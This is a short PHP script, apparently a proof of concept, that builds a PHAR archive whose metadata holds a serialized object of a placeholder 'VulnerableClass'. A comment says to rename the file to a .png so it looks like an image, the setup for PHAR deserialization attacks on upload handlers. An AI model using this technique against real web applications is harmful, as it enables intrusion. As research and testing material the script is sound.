<?php
// $ php --define phar.readonly=0 generate-phar.php
// $ mv poc.phar poc-phar.png

class VulnerableClass {}

$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$object = new VulnerableClass();
$object->data = 'pwned';

$phar->setMetadata($object);
$phar->stopBuffering();
